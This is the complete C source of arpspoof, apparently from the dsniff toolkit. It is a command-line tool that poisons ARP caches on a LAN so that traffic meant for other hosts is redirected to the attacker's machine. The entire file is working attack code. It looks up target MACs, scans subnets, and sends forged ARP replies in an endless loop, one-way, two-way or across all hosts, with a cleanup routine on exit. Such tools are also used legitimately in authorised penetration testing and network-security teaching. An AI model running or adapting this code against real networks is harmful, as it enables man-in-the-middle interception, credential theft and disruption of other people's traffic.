/*
 * arpspoof.c
 *
 * Redirect packets from a target host (or from all hosts) intended for
 * another host on the LAN to ourselves.
 * 
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 *
 * Improved 2011 by Stefan Tomanek <stefa@pico.ruhr.de>
 */

#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "arp.h"
#include "version.h"

/* time to wait between ARP packets */
#define ARP_PAUSE 100000

extern char *ether_ntoa(struct ether_addr *);

struct host {
	in_addr_t ip;
	struct ether_addr mac;
	uint8_t flags;
};

/* host flags */
#define HOST_ACTIVE (1<<0)
#define HOST_SUBNET (1<<1)
#define HOST_TARGET (1<<2)
#define HOST_MODEL  (1<<3)

static int verbose = 0;
static libnet_t *l;
static int n_hosts = 0;
static struct host *hosts;
static char *intf;
static int poison_reverse;
static int poison_mesh;

static uint8_t *my_ha = NULL;
static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";
static uint8_t *zero_ha = "\0\0\0\0\0\0";

static int cleanup_src_own = 1;
static int cleanup_src_host = 0;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-v] [-i interface] [-c own|host|both] [-t target] [-s network/prefixlength] [-m] [-r] [hosts...]\n");
	exit(1);
}

static int
arp_send(libnet_t *l, int op,
	u_int8_t *sha, in_addr_t spa,
	u_int8_t *tha, in_addr_t tpa,
	u_int8_t *me)
{
	int retval;

	if (!me) me = sha;

	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
			     tha, (u_int8_t *)&tpa, l);
	libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
	
	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)me));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
	retval = libnet_write(l);
	if (retval)
		fprintf(stderr, "%s", libnet_geterror(l));

	libnet_clear_packet(l);

	return retval;
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, intf) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
#endif
		usleep(10000);
	}
	while (i++ < 3);

	return (0);
}

static int arp_find_all() {
	struct host *target = hosts;
	while(target->ip) {
		if (arp_find(target->ip, &target->mac)) {
			return 1;
		}
		target++;
	}

	return 0;
}

static int host_add(in_addr_t addr, uint8_t flags) {
	hosts[n_hosts].ip = addr;
	hosts[n_hosts].flags = flags;
	hosts[n_hosts+1].ip = (uint32_t)0;
	return n_hosts++;
}

static int subnet_add(in_addr_t addr, int prefix_length, uint8_t flags) {
	uint32_t mask = ~((1<<(32-prefix_length))-1);
	uint32_t net = (ntohl((uint32_t)addr)) & mask;
	uint32_t brd = (ntohl((uint32_t)addr)) | ~mask;
	uint32_t a;
	for (a = net+1; a<brd; a++) {
		in_addr_t ia = (in_addr_t) htonl(a);
		host_add(ia, HOST_SUBNET|flags);
	}
}

static int active_targets(void) {
	int n = 0;
	struct host *target = hosts;
	for (; target->ip; target++) if (target->flags & HOST_ACTIVE && target->flags & HOST_TARGET) n++;
	return n;
}

static void
cleanup(int sig)
{
	int i;
	int rounds = (cleanup_src_own*5 + cleanup_src_host*5);

	fprintf(stderr, "Cleaning up and re-arping targets...\n");
	for (i = 0; i < rounds; i++) {
		struct host *target = hosts;
		for(;target->ip;target++) {
			uint8_t *src_ha = NULL;

			if (!(target->flags & HOST_TARGET)) continue;
			if (!(target->flags & HOST_ACTIVE)) continue;

			struct host *model = hosts;
			for(;model->ip;model++) {
				if (!(model->flags & HOST_ACTIVE)) continue;
				int fw = arp_find(target->ip, &target->mac);
				int bw = poison_reverse;

				if (!(model->flags & HOST_MODEL)) continue;

				if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
					src_ha = my_ha;
				}
				/* XXX - on BSD, requires ETHERSPOOF kernel. */
				if (fw) {
					arp_send(l, ARPOP_REPLY,
						 (u_int8_t *)&model->mac, model->ip,
						 (target->ip ? (u_int8_t *)&target->mac : brd_ha),
						 target->ip,
						 src_ha);
					/* we have to wait a moment before sending the next packet */
					usleep(ARP_PAUSE);
				}
				if (bw) {
					arp_send(l, ARPOP_REPLY,
						 (u_int8_t *)&target->mac, target->ip,
						 (u_int8_t *)&model->mac,
						 model->ip,
						 src_ha);
					usleep(ARP_PAUSE);
				}
			}
		}
	}

	exit(0);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	char pcap_ebuf[PCAP_ERRBUF_SIZE];
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int c;
	int n_scan_hosts = 0;
	char *scan_prefix = NULL;
	int scan_prefix_length = 32;
	char *cleanup_src = NULL;
	in_addr_t target_addr;

	intf = NULL;
	poison_reverse = 0;
	poison_mesh = 0;
	n_hosts = 0;

	/* allocate enough memory for target list */
	hosts = calloc( argc+1, sizeof(struct host) );

	while ((c = getopt(argc, argv, "vrmi:s:t:c:h?V")) != -1) {
		switch (c) {
		case 'v':
			verbose = 1;
			break;
		case 'i':
			intf = optarg;
			break;
		case 't':
			target_addr = libnet_name2addr4(l, optarg, LIBNET_RESOLVE);
			if (target_addr == -1) {
				usage();
			} else {
				host_add(target_addr, HOST_TARGET);
			}
			break;
		case 'r':
			poison_reverse = 1;
			break;
		case 'm':
			poison_mesh = 1;
			break;
		case 's':
			scan_prefix = strchr(optarg, '/');
			if (scan_prefix) {
				*scan_prefix = '\0';
				scan_prefix_length = atoi(scan_prefix+1);
				if (scan_prefix_length < 0 || scan_prefix_length > 32) {
					usage();
				}
			}
			n_scan_hosts += (1<<(32-scan_prefix_length));
			/* we need some more memory to store the target data */
			int mem = (argc+1 + n_scan_hosts) * sizeof(struct host);
			hosts = realloc( hosts, mem );
			hosts[n_hosts].ip = (uint32_t)0;
			subnet_add(inet_addr(optarg), scan_prefix_length, HOST_TARGET);
			break;
		case 'c':
			cleanup_src = optarg;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (!cleanup_src || strcmp(cleanup_src, "own")==0) { /* default! */
		/* only use our own hw address when cleaning up,
		 * not jeopardizing any bridges on the way to our
		 * target
		 */
		cleanup_src_own = 1;
		cleanup_src_host = 0;
	} else if (strcmp(cleanup_src, "host")==0) {
		/* only use the target hw address when cleaning up;
		 * this can screw up some bridges and scramble access
		 * for our own host, however it resets the arp table
		 * more reliably
		 */
		cleanup_src_own = 0;
		cleanup_src_host = 1;
	} else if (strcmp(cleanup_src, "both")==0) {
		cleanup_src_own = 1;
		cleanup_src_host = 1;
	} else {
		errx(1, "Invalid parameter to -c: use 'own' (default), 'host' or 'both'.");
		usage();
	}

	while (argc--) {
		if ((target_addr = libnet_name2addr4(l, argv[0], LIBNET_RESOLVE)) == -1) {
			errx(1, "Invalid address: %s", argv[0]);
			usage();
		}
		host_add(target_addr, HOST_MODEL);
		argv++;
	}

	if (poison_mesh) {
		struct host *host = hosts;
		for(;host->ip; host++) {
			host->flags |= (HOST_TARGET|HOST_MODEL);
		}
	}

	if (poison_reverse && active_targets() <= 0) {
		errx(1, "Spoofing the reverse path (-r) is only available when specifying at least one target (-t/-s).");
		usage();
	}

	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
		errx(1, "%s", pcap_ebuf);
	
	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
		errx(1, "%s", libnet_ebuf);

	fprintf(stderr, "Scanning %d hw addresses...\n", n_hosts);
	struct host *target = hosts;
	for (; target->ip; target++) {
		if (verbose) {
			fprintf(stderr, "Looking up host %s...\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
		}
		int arp_status = arp_find(target->ip, &target->mac);
		if (arp_status &&
				/* just make sure we are not getting an empty or broadcast address */
				(memcmp(&target->mac, zero_ha, sizeof(struct ether_addr)) != 0) &&
				(memcmp(&target->mac, brd_ha, sizeof(struct ether_addr)) != 0)) {
			target->flags |= HOST_ACTIVE;
			if (target->flags & HOST_SUBNET) {
				fprintf(stderr, "Found host in subnet %s: %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE), ether_ntoa((struct ether_addr *)&target->mac));
			}
		} else {
			target->flags &= (~HOST_ACTIVE);
			if (! (target->flags & HOST_SUBNET)) {
				fprintf(stderr, "Unable to find specified host %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
			}
			if (poison_reverse && target->flags & HOST_MODEL) {
				errx(1, "couldn't arp for spoof host %s",
					libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
				usage();
			}
		}
	}


	if ((my_ha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
		errx(1, "Unable to determine own mac address");
	}

	if (active_targets() == 0) {
		errx(1, "No target hosts found.");
	}

	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	fprintf(stderr, "Starting spoofing process...\n");
	for (;;) {
		struct host *target = hosts;
		for(;target->ip; target++) {
			if (!(target->flags & HOST_TARGET)) continue;
			if (!(target->flags & HOST_ACTIVE)) continue;
			struct host *model = hosts;
			for (;model->ip; model++) {
				if (!(model->flags & HOST_ACTIVE)) continue;
				if (!(model->flags & HOST_MODEL)) continue;
				if (target->ip != model->ip) {
					arp_send(l, ARPOP_REPLY, my_ha, model->ip,
						(target->ip ? (u_int8_t *)&target->mac : brd_ha),
						target->ip,
						my_ha);
					usleep(ARP_PAUSE);
					if (poison_reverse) {
						arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&model->mac, model->ip, my_ha);
						usleep(ARP_PAUSE);
					}
				}
			}
		}

		sleep(2);
	}
	/* NOTREACHED */

	exit(0);
}
